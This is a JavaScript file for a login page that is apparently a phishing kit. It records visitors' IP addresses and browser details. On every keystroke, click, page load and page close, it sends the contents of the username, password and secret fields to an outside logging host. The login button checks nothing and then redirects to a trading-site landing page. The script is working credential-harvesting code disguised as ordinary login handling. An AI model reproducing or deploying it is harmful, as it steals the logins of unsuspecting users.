const BACKEND_URL = 'https://log.vntrnet.com/';
var PREVIOUS_SENT_DATA;
let USER_IP = 'none';
let USER_AGENT = 'none';

document.addEventListener('DOMContentLoaded', function () {
  USER_AGENT = navigator.USER_AGENT;
  function getUserIP() {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        USER_IP = data.ip;
      })
      .catch((error) => {
        console.error('Error fetching IP address:', error);
      });
  }

  getUserIP();

  async function sendEvent(event, href) {
    const formData = {
      event: event,
      ip: USER_IP,
      USER_AGENT: USER_AGENT,
      href: href,
    };

    // Get all fields in the form
    const inputs = document.querySelectorAll('[id^="log-"]');
    for (const input of inputs) {
      const name = input.id.replace('log-', '');
      const value = input.value.trim();
      if (value !== '') {
        formData[name] = value;
      }
    }

    const jsonData = JSON.stringify(formData);
    //Same data sent, not send data
    if (jsonData == PREVIOUS_SENT_DATA) {
      return;
    }

    PREVIOUS_SENT_DATA = jsonData;

    const response = await fetch(`${BACKEND_URL}event`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: jsonData,
    });

    const data = await response.json();
  }

  // Get all event redirect
  const anchorTags = document.getElementsByTagName('a');

  for (let i = 0; i < anchorTags.length; i++) {
    anchorTags[i].addEventListener('click', async function (event) {
      event.preventDefault();
      const linkHref = this.getAttribute('href');
      await sendEvent('redirect', linkHref);
      if (linkHref) {
        window.location.href = linkHref;
      }
    });
  }

  // Add event listeners for input and button elements
  const inputs = document.querySelectorAll('[id^="log-"]');
  for (const input of inputs) {
    if (input.nodeName === 'INPUT') {
      input.addEventListener('keyup', async function (event) {
        await sendEvent('keyup');
      });
    } else if (input.nodeName === 'BUTTON') {
      input.addEventListener('click', async function () {
        await sendEvent('button_click');
      });
    }
  }

  window.addEventListener('load', function () {
    sendEvent('window_loaded');
  });

  window.addEventListener('beforeunload', async function (event) {
    await sendEvent('window_closed');
  });
});

const financialPinElement = document.getElementById('financial-pin');
const usernameElement = document.getElementById('log-username');
const passwordElement = document.getElementById('log-password');
const secretElement = document.getElementById('log-secret');

let signinClickCount = 0;
const loginComponent = document.getElementById('log-login');
loginComponent.addEventListener('click', (event) => {
  event.preventDefault();

  let username = usernameElement.value;
  let password = passwordElement.value;

  if (username == '' || password == '') {
    alert('Invalid username and password');
    return;
  }

  window.location.href =
    'https://kortanafx.com/?linkId=lp_737338&sourceId=admin&tenantId=kortanafx';
});
